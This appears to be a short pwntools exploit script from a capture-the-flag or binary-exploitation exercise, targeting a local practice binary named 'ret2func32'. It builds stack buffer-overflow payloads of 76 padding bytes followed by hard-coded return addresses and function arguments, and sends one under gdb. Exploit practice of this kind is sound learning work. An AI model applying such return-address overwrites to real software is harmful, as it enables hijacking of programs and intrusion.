

from pwn import *
context.terminal = ['xterm-256color', '-e']
elf = context.binary = ELF("./ret2func32")
r = gdb.debug(["./ret2func32"], "b *vuln+12")
# r = process(["./ret2func32"])


argfunc1 = p32(0xdeadbeef)
argfunc2 = p32(0xcafebabe)
argwin = 0x080486d0 

payload = b'a'*76 + p32(0x0804852E) + p32(0x1) + p32(0x08048543) + argfunc1 + p32(0x08048558) + argfunc2 + p32(0x3) +p32(argwin)
# payload2 = b'a'*72 +p32(0x0804852D) + p32(0x0804852D) + p32(0x08048542) + argfunc1 + argfunc2 +p32(0xc)
payload3 = b'a'*76 + p32(0x0804859A)
pause()
# r.recvuntil(b"Guess my name")
r.sendline(payload3)
r.interactive()